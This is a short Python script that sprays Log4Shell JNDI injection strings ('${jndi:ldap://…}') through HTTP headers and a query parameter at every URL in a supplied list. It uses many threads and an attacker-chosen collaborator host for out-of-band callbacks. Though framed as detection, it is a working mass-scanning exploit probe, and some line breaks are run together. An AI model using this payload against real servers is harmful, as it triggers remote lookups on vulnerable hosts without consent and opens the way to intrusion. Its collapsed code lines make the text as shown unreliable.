from sys import argv
from requests import get
from urllib3 import disable_warnings
from concurrent.futures import ThreadPoolExecutordisable_warnings()proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}def sendDetectionRequest(url, urlId):
    try:
        payload = '${jndi:ldap://' + str(urlId) + '.' + argv[2] + '/a}'
        params = {'id':payload}
        headers = {'User-Agent':payload, 'Referer':payload, 'X-Api-Version':payload, 'X-Forwarded-For':payload} #You_may_add_other_headers_here.
        url = url.strip()
        print('[{}] Testing {}'.format(urlId, url))
        get(url, headers=headers, params=params, verify=False, proxies=proxies, timeout=10)
    except Exception as e:
        print(e)
        passthreads = []
urlId = 0
if len(argv) > 1:
    urlFile = open(argv[1], 'r')
    urlList = urlFile.readlines()
    with ThreadPoolExecutor(max_workers=15) as executor:
        for url in urlList:
            urlId += 1
            threads.append(executor.submit(sendDetectionRequest, url, urlId))
else:
    print('[!] Syntax: python3 {} <urlFile> <collaboratorPayload>'.format(argv[0]))
